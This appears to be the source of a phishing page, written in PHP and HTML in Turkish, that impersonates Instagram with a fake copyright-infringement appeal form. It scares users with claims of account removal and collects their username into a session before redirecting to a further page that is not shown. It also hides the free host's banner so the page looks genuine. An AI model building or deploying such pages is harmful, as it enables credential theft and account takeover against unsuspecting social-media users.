<?php

if ($_GET) {
    $username=$_GET["username"];
    session_start();
    $_SESSION["username"]=$username;
    header("location: user.php?user=$username");
}
?>

<!DOCTYPE html>
<style>img[alt="www.000webhost.com"]{display:none;}</style>
<html>
<head>
<link rel="stylesheet" href="css/xss1.css">
<link rel="stylesheet" type="text/css" href="css/xss2.css">
<link rel="stylesheet" href="css/xss3.css">
<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<title>| Destek merkezi</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1, user-scalable=no">
<link rel="icon" href="image/ig-logo.png">
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css" crossorigin="anonymous">
</head>
<body>
<header>
<table>
<tr>
<td><i id="line" class="fas fa-instagram"></i></td>
<td><i class="fas fa-bars" id="line"></i></td>
</tr>
</table>
<!--
<center>
<div class="get">
<span class="main" id="rgb" style="font-size: 30px!important;		width:50%!important;">Copyright Infringement</span>
<br>
</div>
</center>
-->
</header>
<center>
<div class="home">
<br><br>
<div class="mx">
<div class="wrapper fadeInDown">
<div id="formContent">
<br>
<div class="fadeIn first">
<img src="image/shop.jpg" style="max-width:90%; border-radius:50%;" width="135">
<br><br>
	  <br>
				<h3>Telif Hakkı İtiraz Formu </h3>
		<br>
		<p style="color:#212529;font-family:arial;font-weight:bold;font-size:100%">
Instagram olarak telif hakkı <br>yasalarımızı ihlal eden hesapları<br> kaldırıyoruz. Hesabınızla ilgili telif<br> hakkı ihlali hakkında bilgi almak ve<br> itiraz etmek için kullanıcı adınızı<br> girerek devam edin.


</p>
<form autocomplete="off" method="get">
<input type="text" required="" id="login" class="fadeIn second" name="username" placeholder="Kullanıcı adı">
<center>
<button type="submit" class=" button submit">
İleri</button>
</center>
</form>
</div>
</div>
<br><br>
</div>
</div>
</div>
</center>
<center>
<div class="bottom"><br><br>
<h3 class="bottom-h3">DOWNLOAD FOR<br>IOS / ANDROID</h3><br>
<img src="image/store.jpg" width="325">
<br><br>
<table class="bottom-table">
<tr>
<td><span>About Us</span></td>
<td><span>Safety</span></td>
</tr>
<tr>
<td><span>Features</span></td>
<td><span>Blog</span></td>
</tr>
<tr>
<td><span>Community</span></td>
<td><span>Help</span></td>
</tr>
<tr>
<td><span>Business</span></td>
<td><span>Brand Assets</span></td>
</tr>
</table>
<br><br>
<img src="image/meta.svg" width="325">
<br><br><br>
</div>
</center>
</style>
</body>
<style type="text/css">
button.button {
  border-radius: 100rem;
  padding: 1rem;
  font-family: 'Avenir Next';
  font-size: 1rem;
  padding: .5rem 3rem;
  color: $color-black;
  box-shadow: 0 0 6px 0 rgba(157, 96, 212, 0.5);
  border: solid 1px transparent;
  background-image: linear-gradient(rgba(255, 255, 255, 0), rgba(255, 255, 255, 0)), linear-gradient(101deg, #78e4ff, #ff48fa);
  background-origin: border-box;
  background-clip: content-box, border-box;
  box-shadow: 2px 1000px 1px #fff inset;
}</style>
</html>
